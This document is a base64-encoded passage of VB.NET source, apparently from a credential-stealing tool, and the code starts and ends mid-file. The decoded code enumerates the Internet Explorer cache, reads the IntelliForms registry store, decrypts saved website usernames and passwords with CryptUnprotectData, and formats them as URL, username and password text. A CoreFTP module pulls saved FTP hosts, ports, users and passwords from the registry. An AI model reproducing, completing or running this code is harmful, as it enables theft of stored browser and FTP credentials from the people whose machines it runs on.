KENyeXB0RGxsKT4gXw0KICAgIFB1YmxpYyBGdW5jdGlvbiBDcnlwdERlc3Ryb3lLZXkoQnlWYWwg aEtleSBBcyBJbnRQdHIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KDQogICAgPERs bEltcG9ydCgid2luaW5ldC5kbGwiLCBTZXRMYXN0RXJyb3I6PVRydWUsIENoYXJTZXQ6PUNoYXJT ZXQuQXV0byk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gRmluZEZpcnN0VXJsQ2FjaGVFbnRyeSg8 TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBUU3RyKT4gQnlWYWwgbHBzelVybFNlYXJjaFBhdHRl cm4gQXMgU3RyaW5nLCBCeVZhbCBscEZpcnN0Q2FjaGVFbnRyeUluZm8gQXMgSW50UHRyLCBCeVJl ZiBscGR3Rmlyc3RDYWNoZUVudHJ5SW5mb0J1ZmZlclNpemUgQXMgSW50ZWdlcikgQXMgSW50UHRy DQogICAgRW5kIEZ1bmN0aW9uDQoNCg0KICAgIDxEbGxJbXBvcnQoIndpbmluZXQuZGxsIiwgU2V0 TGFzdEVycm9yOj1UcnVlLCBDaGFyU2V0Oj1DaGFyU2V0LkF1dG8pPiBfDQogICAgUHVibGljIEZ1 bmN0aW9uIEZpbmROZXh0VXJsQ2FjaGVFbnRyeShCeVZhbCBoRW51bUhhbmRsZSBBcyBJbnRQdHIs IEJ5VmFsIGxwTmV4dENhY2hlRW50cnlJbmZvIEFzIEludFB0ciwgQnlSZWYgbHBkd05leHRDYWNo ZUVudHJ5SW5mb0J1ZmZlclNpemUgQXMgSW50ZWdlcikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5j dGlvbg0KDQogICAgPERsbEltcG9ydCgid2luaW5ldC5kbGwiKT4gXw0KICAgIFB1YmxpYyBGdW5j dGlvbiBGaW5kQ2xvc2VVcmxDYWNoZShCeVZhbCBoRW51bUhhbmRsZSBBcyBJbnRQdHIpIEFzIEJv b2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoIkNyeXB0MzIuZGxsIiwg U2V0TGFzdEVycm9yOj1UcnVlLCBDaGFyU2V0Oj1TeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vydmlj ZXMuQ2hhclNldC5BdXRvKT4gXw0KUHJpdmF0ZSBGdW5jdGlvbiBDcnlwdFVucHJvdGVjdERhdGEo QnlSZWYgcERhdGFJbiBBcyBEQVRBX0JMT0IsIEJ5VmFsIHN6RGF0YURlc2NyIEFzIEludGVnZXIs IEJ5UmVmIHBPcHRpb25hbEVudHJvcHkgQXMgREFUQV9CTE9CLCBCeVZhbCBwdlJlc2VydmVkIEFz IEludGVnZXIsIEJ5VmFsIHBQcm9tcHRTdHJ1Y3QgQXMgSW50ZWdlciwgQnlWYWwgZHdGbGFncyBB cyBJbnRlZ2VyLCBCeVJlZiBwRGF0YU91dCBBcyBEQVRBX0JMT0IpIEFzIEJvb2xlYW4NCiAgICBF bmQgRnVuY3Rpb24NCg0KICAgIDxTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBD aGFyU2V0Oj1DaGFyU2V0LkF1dG8pPiBfDQogICAgUHVibGljIFN0cnVjdHVyZSBJTlRFUk5FVF9D QUNIRV9FTlRSWV9JTkZPDQogICAgICAgIFB1YmxpYyBkd1N0cnVjdFNpemUgQXMgSW50ZWdlcg0K ICAgICAgICA8TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBUU3RyKT4gXw0KICAgICAgICBQdWJs aWMgbHBzelNvdXJjZVVybE5hbWUgQXMgW1N0cmluZ10NCiAgICAgICAgPE1hcnNoYWxBcyhVbm1h bmFnZWRUeXBlLkxQVFN0cik+IF8NCiAgICAgICAgUHVibGljIGxwc3pMb2NhbEZpbGVOYW1lIEFz IFtTdHJpbmddDQogICAgICAgIFB1YmxpYyBDYWNoZUVudHJ5VHlwZSBBcyBJbnRlZ2VyDQogICAg ICAgIFB1YmxpYyBkd1VzZUNvdW50IEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3SGl0UmF0 ZSBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBkd1NpemVMb3cgQXMgSW50ZWdlcg0KICAgICAg ICBQdWJsaWMgZHdTaXplSGlnaCBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBMYXN0TW9kaWZp ZWRUaW1lIEFzIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Db21UeXBlcy5GSUxFVElN RQ0KICAgICAgICBQdWJsaWMgRXhwaXJlVGltZSBBcyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vy dmljZXMuQ29tVHlwZXMuRklMRVRJTUUNCiAgICAgICAgUHVibGljIExhc3RBY2Nlc3NUaW1lIEFz IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Db21UeXBlcy5GSUxFVElNRQ0KICAgICAg ICBQdWJsaWMgTGFzdFN5bmNUaW1lIEFzIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5D b21UeXBlcy5GSUxFVElNRQ0KICAgICAgICBQdWJsaWMgbHBIZWFkZXJJbmZvIEFzIEludFB0cg0K ICAgICAgICBQdWJsaWMgZHdIZWFkZXJJbmZvU2l6ZSBBcyBJbnRlZ2VyDQogICAgICAgIFB1Ymxp YyBscHN6RmlsZUV4dGVuc2lvbiBBcyBJbnRQdHINCiAgICAgICAgUHVibGljIGR3RXhlbXB0RGVs dGEgQXMgSW50ZWdlcg0KICAgIEVuZCBTdHJ1Y3R1cmUNCg0KICAgIDxTdHJ1Y3RMYXlvdXQoTGF5 b3V0S2luZC5TZXF1ZW50aWFsKT4gXw0KICAgIFByaXZhdGUgU3RydWN0dXJlIERBVEFfQkxPQg0K ICAgICAgICBQdWJsaWMgY2JEYXRhIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIHBiRGF0YSBB cyBJbnRQdHINCiAgICBFbmQgU3RydWN0dXJlDQoNCiAgICBQdWJsaWMgSUVfS0VZIEFzIFN0cmlu ZyA9ICJTb2Z0d2FyZVxNaWNyb3NvZnRcSW50ZXJuZXQgRXhwbG9yZXJcSW50ZWxsaUZvcm1zXFN0 b3JhZ2UyIg0KDQogICAgUHVibGljIHZpc2l0ZWQgQXMgU3RyaW5nID0gIiINCiAgICBQdWJsaWMg aWVkYXRhIEFzIFN0cmluZyA9ICIiDQogICAgQ29uc3QgRVJST1JfTk9fTU9SRV9JVEVNUyBBcyBJ bnRlZ2VyID0gMjU5DQoNCiAgICBQdWJsaWMgU3ViIGdldGllKCkNCiAgICAgICAgVHJ5DQogICAg ICAgICAgICBEaW0gbmVlZGVkQnl0ZXMgQXMgSW50ZWdlciA9IDANCiAgICAgICAgICAgIEZpbmRG aXJzdFVybENhY2hlRW50cnkoTm90aGluZywgSW50UHRyLlplcm8sIG5lZWRlZEJ5dGVzKQ0KICAg ICAgICAgICAgSWYgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpID0gRVJST1JfTk9fTU9SRV9J VEVNUyBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICBFbmQgSWYNCiAg ICAgICAgICAgIERpbSBidWZmZXJCeXRlU2l6ZSBBcyBJbnRlZ2VyID0gbmVlZGVkQnl0ZXMNCiAg ICAgICAgICAgIERpbSBidWZmZXJQdHIgQXMgSW50UHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwo YnVmZmVyQnl0ZVNpemUpDQogICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICBEaW0gaEVu dW0gQXMgSW50UHRyID0gRmluZEZpcnN0VXJsQ2FjaGVFbnRyeShOb3RoaW5nLCBidWZmZXJQdHIs IG5lZWRlZEJ5dGVzKQ0KICAgICAgICAgICAgICAgIERpbSBzdWNjZXNzZnVsIEFzIEJvb2xlYW4N CiAgICAgICAgICAgICAgICBEaW0gY2FjaGVJdGVtIEFzIElOVEVSTkVUX0NBQ0hFX0VOVFJZX0lO Rk8NCiAgICAgICAgICAgICAgICBEbw0KICAgICAgICAgICAgICAgICAgICBjYWNoZUl0ZW0gPSBE aXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoYnVmZmVyUHRyLCBHZXRUeXBlKElOVEVS TkVUX0NBQ0hFX0VOVFJZX0lORk8pKSwgSU5URVJORVRfQ0FDSEVfRU5UUllfSU5GTykNCiAgICAg ICAgICAgICAgICAgICAgRGltIHRtcCBBcyBTdHJpbmcgPSBjYWNoZUl0ZW0ubHBzelNvdXJjZVVy bE5hbWUNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gdG1wLlRvTG93ZXIoKQ0KICAgICAgICAg ICAgICAgICAgICB0bXAgPSB0bXAuU3Vic3RyaW5nKHRtcC5JbmRleE9mKCJAIikgKyAxKQ0KICAg ICAgICAgICAgICAgICAgICBJZiB0bXAuSW5kZXhPZigiPyIpID4gMCBUaGVuDQogICAgICAgICAg ICAgICAgICAgICAgICB0bXAgPSB0bXAuU3Vic3RyaW5nKDAsIHRtcC5JbmRleE9mKCI/IikpDQog ICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBEaW0gc0hhc2gg QXMgU3RyaW5nID0gR2V0U0hBMUhhc2godG1wLCAodG1wLkxlbmd0aCArIDEpICogMikNCiAgICAg ICAgICAgICAgICAgICAgRGltIGJIYXNoRGF0YSBBcyBCeXRlKCkgPSBEaXJlY3RDYXN0KFJlZ2lz dHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoSUVfS0VZKS5HZXRWYWx1ZShzSGFzaCwgTm90aGlu ZyksIEJ5dGUoKSkNCiAgICAgICAgICAgICAgICAgICAgSWYgTm90IGJIYXNoRGF0YSBJcyBOb3Ro aW5nIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIElmIE5vdCB2aXNpdGVkLkNvbnRhaW5z KHRtcCkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlY3J5cHRDcmVkZW50aWFs KHRtcCwgc0hhc2gsIGJIYXNoRGF0YS5MZW5ndGgsIGJIYXNoRGF0YSkNCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICB2aXNpdGVkICs9IHRtcCArICIgIg0KICAgICAgICAgICAgICAgICAgICAg ICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAg ICAgIHRtcCArPSAiLyINCiAgICAgICAgICAgICAgICAgICAgICAgIERpbSBzSGFzaDIgQXMgU3Ry aW5nID0gR2V0U0hBMUhhc2godG1wLCAodG1wLkxlbmd0aCArIDEpICogMikNCiAgICAgICAgICAg ICAgICAgICAgICAgIERpbSBiSGFzaERhdGEyIEFzIEJ5dGUoKSA9IERpcmVjdENhc3QoUmVnaXN0 cnkuQ3VycmVudFVzZXIuT3BlblN1YktleShJRV9LRVkpLkdldFZhbHVlKHNIYXNoMiwgTm90aGlu ZyksIEJ5dGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIElmIE5vdCBiSGFzaERhdGEyIElz IE5vdGhpbmcgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIE5vdCB2aXNpdGVk LkNvbnRhaW5zKHRtcCkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWNy eXB0Q3JlZGVudGlhbCh0bXAsIHNIYXNoMiwgYkhhc2hEYXRhMi5MZW5ndGgsIGJIYXNoRGF0YTIp DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpc2l0ZWQgKz0gdG1wICsgIiAiDQog ICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgICAg ICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAg IG5lZWRlZEJ5dGVzID0gYnVmZmVyQnl0ZVNpemUNCiAgICAgICAgICAgICAgICAgICAgc3VjY2Vz c2Z1bCA9IEZpbmROZXh0VXJsQ2FjaGVFbnRyeShoRW51bSwgYnVmZmVyUHRyLCBuZWVkZWRCeXRl cykNCiAgICAgICAgICAgICAgICAgICAgSWYgc3VjY2Vzc2Z1bCBPckVsc2UgTWFyc2hhbC5HZXRM YXN0V2luMzJFcnJvcigpIDw+IEVSUk9SX05PX01PUkVfSVRFTVMgVGhlbg0KICAgICAgICAgICAg ICAgICAgICAgICAgSWYgTm90IHN1Y2Nlc3NmdWwgQW5kQWxzbyBuZWVkZWRCeXRlcyA+IGJ1ZmZl ckJ5dGVTaXplIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWZmZXJCeXRlU2l6 ZSA9IG5lZWRlZEJ5dGVzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGltIGZnZmcgQXMg TmV3IEludFB0cihidWZmZXJCeXRlU2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBi dWZmZXJQdHIgPSBNYXJzaGFsLlJlQWxsb2NIR2xvYmFsKGJ1ZmZlclB0ciwgZmdmZykNCiAgICAg ICAgICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsID0gVHJ1ZQ0KICAgICAgICAgICAgICAg ICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAg ICAgIExvb3AgV2hpbGUgc3VjY2Vzc2Z1bA0KICAgICAgICAgICAgRmluYWxseQ0KICAgICAgICAg ICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwoYnVmZmVyUHRyKQ0KDQogICAgICAgICAgICBFbmQg VHJ5DQogICAgICAgICAgICBFeGl0IFN1Yg0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24N CiAgICAgICAgRW5kIFRyeQ0KDQogICAgRW5kIFN1Yg0KDQoNCg0KICAgIFB1YmxpYyBGdW5jdGlv biBHZXRTSEExSGFzaChCeVZhbCBwYkRhdGEgQXMgU3RyaW5nLCBCeVZhbCBsZW5ndGggQXMgSW50 ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIERpbSBoUHJvdiBBcyBJbnRQdHINCiAgICAgICAgRGlt IEhhc2ggQXMgSW50UHRyDQogICAgICAgIERpbSBkYXRhIEFzIEJ5dGUoKSA9IE5ldyBCeXRlKDIw KSB7fQ0KICAgICAgICBEaW0gc2RhdGEgQXMgU3RyaW5nID0gIiINCiAgICAgICAgRGltIGxlbiBB cyBJbnRlZ2VyID0gMjANCiAgICAgICAgQ3J5cHRBY3F1aXJlQ29udGV4dChoUHJvdiwgTm90aGlu ZywgTm90aGluZywgUFJPVl9SU0FfRlVMTCwgMCkNCiAgICAgICAgQ3J5cHRDcmVhdGVIYXNoKGhQ cm92LCBDQUxHX1NIQSwgSW50UHRyLlplcm8sIDAsIEhhc2gpDQogICAgICAgIENyeXB0SGFzaERh dGEoSGFzaCwgVmFyUHRyKHBiRGF0YSksIGxlbmd0aCwgMCkNCiAgICAgICAgQ3J5cHRHZXRIYXNo UGFyYW0oSGFzaCwgSFBfSEFTSFZBTCwgZGF0YSwgbGVuLCAwKQ0KICAgICAgICBDcnlwdERlc3Ry b3lIYXNoKEhhc2gpDQogICAgICAgIENyeXB0UmVsZWFzZUNvbnRleHQoaFByb3YsIDApDQogICAg ICAgIERpbSBpIEFzIEludGVnZXIgPSAwDQogICAgICAgIFdoaWxlIGkgPCAyMA0KICAgICAgICAg ICAgc2RhdGEgKz0gU3RyaW5ncy5SaWdodCgiMDAiICsgZGF0YShpKS5Ub1N0cmluZygiWCIpLCAy KQ0KICAgICAgICAgICAgU3lzdGVtLk1hdGguTWF4KFN5c3RlbS5UaHJlYWRpbmcuSW50ZXJsb2Nr ZWQuSW5jcmVtZW50KGkpLCBpIC0gMSkNCiAgICAgICAgRW5kIFdoaWxlDQogICAgICAgIHNkYXRh ICs9IFN0cmluZ3MuUmlnaHQoIjAwIiArIENoZWNrU3VtKHNkYXRhKS5Ub1N0cmluZygiWCIpLCAy KQ0KICAgICAgICBSZXR1cm4gc2RhdGENCiAgICBFbmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgRnVu Y3Rpb24gQ2hlY2tTdW0oQnlWYWwgcyBBcyBTdHJpbmcpIEFzIEJ5dGUNCiAgICAgICAgRGltIHN1 bSBBcyBJbnRlZ2VyID0gMA0KICAgICAgICBEaW0gY2hlY2sgQXMgQnl0ZQ0KICAgICAgICBEaW0g aSBBcyBJbnRlZ2VyID0gMQ0KICAgICAgICBXaGlsZSBpIDwgcy5MZW5ndGgNCiAgICAgICAgICAg IElmIChpIE1vZCAyKSA8PiAwIFRoZW4NCiAgICAgICAgICAgICAgICBzdW0gKz0gQ29udmVydC5U b0ludDMyKENvbnZlcnNpb24uVmFsKCImSCIgKyBTdHJpbmdzLk1pZChzLCBpLCAyKSkpDQogICAg ICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIFN5c3RlbS5NYXRoLk1heChTeXN0ZW0uVGhyZWFk aW5nLkludGVybG9ja2VkLkluY3JlbWVudChpKSwgaSAtIDEpDQogICAgICAgIEVuZCBXaGlsZQ0K ICAgICAgICBjaGVjayA9IENvbnZlcnQuVG9CeXRlKHN1bSBNb2QgMjU2KQ0KICAgICAgICBSZXR1 cm4gY2hlY2sNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgU3ViIERlY3J5cHRDcmVkZW50 aWFsKEJ5VmFsIHNVUkwgQXMgU3RyaW5nLCBCeVZhbCBzSGFzaCBBcyBTdHJpbmcsIEJ5VmFsIExl bmd0aCBBcyBJbnRlZ2VyLCBCeVZhbCBkYXRhIEFzIEJ5dGUoKSkNCiAgICAgICAgRGltIGRhdGFJ biBBcyBOZXcgREFUQV9CTE9CKCkNCiAgICAgICAgRGltIGRhdGFPdXQgQXMgTmV3IERBVEFfQkxP QigpDQogICAgICAgIERpbSBkYXRhRXh0cmEgQXMgTmV3IERBVEFfQkxPQigpDQogICAgICAgIERp bSBoSGVhZGVyIEFzIE5ldyBTdHJpbmdJbmRleEhlYWRlcigpDQogICAgICAgIERpbSBoRW50cnkg QXMgTmV3IFN0cmluZ0luZGV4RW50cnkoKQ0KICAgICAgICBEaW0gbmV3cHRyIEFzIEludFB0ciA9 IE1hcnNoYWwuQWxsb2NIR2xvYmFsKExlbmd0aCkNCiAgICAgICAgTWFyc2hhbC5Db3B5KGRhdGEs IDAsIG5ld3B0ciwgTGVuZ3RoKQ0KICAgICAgICBkYXRhSW4uY2JEYXRhID0gTGVuZ3RoDQogICAg ICAgIGRhdGFJbi5wYkRhdGEgPSBuZXdwdHINCiAgICAgICAgZGF0YUV4dHJhLmNiRGF0YSA9IChz VVJMLkxlbmd0aCArIDEpICogMg0KICAgICAgICBkYXRhRXh0cmEucGJEYXRhID0gVmFyUHRyKHNV UkwpDQogICAgICAgIElmIENyeXB0VW5wcm90ZWN0RGF0YShkYXRhSW4sIDAsIGRhdGFFeHRyYSwg MCwgMCwgMCwgXw0KICAgICAgICAgZGF0YU91dCkgVGhlbg0KICAgICAgICAgICAgRGltIHB0ckRh dGEgQXMgTmV3IEludFB0cihkYXRhT3V0LnBiRGF0YS5Ub0ludDMyKCkgKyBNYXJzaGFsLlJlYWRC eXRlKGRhdGFPdXQucGJEYXRhKSkNCiAgICAgICAgICAgIGhIZWFkZXIgPSBEaXJlY3RDYXN0KE1h cnNoYWwuUHRyVG9TdHJ1Y3R1cmUocHRyRGF0YSwgaEhlYWRlci5bR2V0VHlwZV0oKSksIFN0cmlu Z0luZGV4SGVhZGVyKQ0KICAgICAgICAgICAgSWYgaEhlYWRlci5kd1R5cGUgPSAxIEFuZEFsc28g aEhlYWRlci5kd0VudHJpZXNDb3VudCA+PSAyIFRoZW4NCiAgICAgICAgICAgICAgICBEaW0gZW50 cnlEYXRhIEFzIE5ldyBJbnRQdHIocHRyRGF0YS5Ub0ludDMyKCkgKyBoSGVhZGVyLmR3U3RydWN0 U2l6ZSkNCiAgICAgICAgICAgICAgICBEaW0gc3RydWN0RGF0YSBBcyBOZXcgSW50UHRyKGVudHJ5 RGF0YS5Ub0ludDMyKCkgKyAoKGhIZWFkZXIuZHdFbnRyaWVzQ291bnQgKyAwKSAqIE1hcnNoYWwu U2l6ZU9mKGhFbnRyeSkpKQ0KICAgICAgICAgICAgICAgIERpbSBpIEFzIEludGVnZXIgPSAwDQog ICAgICAgICAgICAgICAgV2hpbGUgaSA8IChoSGVhZGVyLmR3RW50cmllc0NvdW50IC8gMikNCiAg ICAgICAgICAgICAgICAgICAgSWYgaSA8PiAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAg IGVudHJ5RGF0YSA9IE5ldyBJbnRQdHIoZW50cnlEYXRhLlRvSW50MzIoKSArIE1hcnNoYWwuU2l6 ZU9mKGhFbnRyeSkpDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAg ICAgICBoRW50cnkgPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoZW50cnlEYXRh LCBoRW50cnkuW0dldFR5cGVdKCkpLCBTdHJpbmdJbmRleEVudHJ5KQ0KICAgICAgICAgICAgICAg ICAgICBEaW0gc1VzZXJuYW1lIEFzIFN0cmluZyA9IE1hcnNoYWwuUHRyVG9TdHJpbmdBdXRvKE5l dyBJbnRQdHIoc3RydWN0RGF0YS5Ub0ludDMyKCkgKyBoRW50cnkuZHdEYXRhT2Zmc2V0KSkNCiAg ICAgICAgICAgICAgICAgICAgZW50cnlEYXRhID0gTmV3IEludFB0cihlbnRyeURhdGEuVG9JbnQz MigpICsgTWFyc2hhbC5TaXplT2YoaEVudHJ5KSkNCiAgICAgICAgICAgICAgICAgICAgaEVudHJ5 ID0gRGlyZWN0Q2FzdChNYXJzaGFsLlB0clRvU3RydWN0dXJlKGVudHJ5RGF0YSwgaEVudHJ5LltH ZXRUeXBlXSgpKSwgU3RyaW5nSW5kZXhFbnRyeSkNCiAgICAgICAgICAgICAgICAgICAgRGltIHNQ YXNzd29yZCBBcyBTdHJpbmcgPSBNYXJzaGFsLlB0clRvU3RyaW5nQXV0byhOZXcgSW50UHRyKHN0 cnVjdERhdGEuVG9JbnQzMigpICsgaEVudHJ5LmR3RGF0YU9mZnNldCkpDQogICAgICAgICAgICAg ICAgICAgIGllZGF0YSA9IGllZGF0YSAmICJ+fn5+fklFIDcvOH5+fn5+Ig0KICAgICAgICAgICAg ICAgICAgICBpZWRhdGEgPSBpZWRhdGEgJiBFbnZpcm9ubWVudC5OZXdMaW5lDQogICAgICAgICAg ICAgICAgICAgIGllZGF0YSA9IGllZGF0YSAmICJVUkw6ICIgKyBzVVJMDQogICAgICAgICAgICAg ICAgICAgIGllZGF0YSA9IGllZGF0YSAmIEVudmlyb25tZW50Lk5ld0xpbmUNCiAgICAgICAgICAg ICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgKCJVc2VybmFtZTogIiArIHNVc2VybmFtZSkNCiAg ICAgICAgICAgICAgICAgICAgaWVkYXRhID0gaWVkYXRhICYgRW52aXJvbm1lbnQuTmV3TGluZQ0K ICAgICAgICAgICAgICAgICAgICBpZWRhdGEgPSBpZWRhdGEgJiAoIlBhc3N3b3JkOiAiICsgc1Bh c3N3b3JkKQ0KICAgICAgICAgICAgICAgICAgICBpZWRhdGEgPSBpZWRhdGEgJiBFbnZpcm9ubWVu dC5OZXdMaW5lDQogICAgICAgICAgICAgICAgICAgIGllZGF0YSA9IGllZGF0YSAmICJ+fn5+fn5+ fn5+Ig0KICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uTWF0aC5NYXgoU3lzdGVtLlRocmVhZGlu Zy5JbnRlcmxvY2tlZC5JbmNyZW1lbnQoaSksIGkgLSAxKQ0KDQogICAgICAgICAgICAgICAgRW5k IFdoaWxlDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRW5kIElmDQogICAgICAgIEV4aXQg U3ViDQogICAgRW5kIFN1Yg0KICAgIFB1YmxpYyBGdW5jdGlvbiBWYXJQdHIoQnlWYWwgbyBBcyBP YmplY3QpIEFzIEludFB0cg0KICAgICAgICBEaW0gR0MgQXMgU3lzdGVtLlJ1bnRpbWUuSW50ZXJv cFNlcnZpY2VzLkdDSGFuZGxlID0gU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkdDSGFu ZGxlLkFsbG9jKG8sIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5HQ0hhbmRsZVR5cGUu UGlubmVkKQ0KICAgICAgICBSZXR1cm4gR0MuQWRkck9mUGlubmVkT2JqZWN0KCkNCiAgICBFbmQg RnVuY3Rpb24NCiAgICBQdWJsaWMgRnVuY3Rpb24gUmlnaHQoQnlWYWwgcGFyYW0gQXMgU3RyaW5n LCBCeVZhbCBsZW5ndGggQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIERpbSByZXN1bHQz MyBBcyBTdHJpbmcgPSBwYXJhbS5TdWJzdHJpbmcocGFyYW0uTGVuZ3RoIC0gbGVuZ3RoLCBsZW5n dGgpDQogICAgICAgIFJldHVybiByZXN1bHQzMw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1Ymxp YyBGdW5jdGlvbiBNaWQoQnlWYWwgcGFyYW0gQXMgU3RyaW5nLCBCeVZhbCBzdGFydEluZGV4IEFz IEludGVnZXIsIEJ5VmFsIGxlbmd0aCBBcyBJbnRlZ2VyKSBBcyBTdHJpbmcNCiAgICAgICAgRGlt IHJlc3VsdCBBcyBTdHJpbmcgPSBwYXJhbS5TdWJzdHJpbmcoc3RhcnRJbmRleCwgbGVuZ3RoKQ0K ICAgICAgICBSZXR1cm4gcmVzdWx0DQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1 bGUgQ29yZUZUUA0KICAgIEZ1bmN0aW9uIENvcmVGVFAoKSBBcyBTdHJpbmcNCiAgICAgICAgRGlt IHNQYXRoIEFzIFN0cmluZyA9IEVudmlyb24kKCJBUFBEQVRBIikgJiAiXENvcmVGVFBcc2l0ZXMu aWR4Ig0KICAgICAgICBEaW0gc0ZpbGUgQXMgU3RyaW5nID0gUmVhZEZpbGUoc1BhdGgpDQogICAg ICAgIERpbSBzSG9zdCBBcyBTdHJpbmcgPSBSZWdSZWFkKCJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0 d2FyZVxGVFBXYXJlXENPUkVGVFBcU2l0ZXNcIiAmIHNGaWxlICYgIlxIb3N0IikNCiAgICAgICAg RGltIHNQb3J0IEFzIFN0cmluZyA9IFJlZ1JlYWQoIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJl XEZUUFdhcmVcQ09SRUZUUFxTaXRlc1wiICYgc0ZpbGUgJiAiXFBvcnQiKQ0KICAgICAgICBEaW0g c1VzZXIgQXMgU3RyaW5nID0gUmVnUmVhZCgiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcRlRQ V2FyZVxDT1JFRlRQXFNpdGVzXCIgJiBzRmlsZSAmICJcVXNlciIpDQogICAgICAgIERpbSBzUHdk IEFzIFN0cmluZyA9IFJlZ1JlYWQoIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXEZUUFdhcmVc Q09SRUZUUFxTaXRlc1wiICYgc0ZpbGUgJiAiXFBXIikNCiAgICAgICAgRGltIHNFbnRyeSBBcyBT dHJpbmcgPSBSZWdSZWFkKCJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxGVFBXYXJlXENPUkVG VFBcU2l0ZXNcIiAmIHNGaWxlICYgIlxOYW1lIikNCg0KICAgICAgICBJZiBOb3Qgc1VzZXIgPSAi IiBUaGVuDQogICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICBDb3JlRlRQID0gIkVudHJ5 OiAiICsgc0VudHJ5ICsgdmJOZXdMaW5lICsgIkhvc3Q6ICIgKyBzSG9zdCArICI6IiArIHNQb3J0 ICsgdmJOZXdMaW5lICsgIlVzZXI6ICIgKyBzVXNlciArIHZiTmV3TGluZSArICJQd2Q6ICIgKyBz UHdkICsgIiAoRW5jcnlwdCkiDQogICAgICAgICAgICAgICAgRGltIG5sIEFzIFN0cmluZyA9IHZi TmV3TGluZQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAg ICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fkNvcmVGVFB+fn5+fiIpDQogICAg ICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0 XS5bODhdLkFwcGVuZFRleHQoIkVudHJ5OiAiICYgc0VudHJ5KQ0KICAgICAgICAgICAgICAgIFsy NF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRU ZXh0KCJIb3N0OiAiICYgc0hvc3QpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRl eHQoIjogIiAmIHNQb3J0KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5s KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJVc2VyOiAiICYgc1VzZXIp 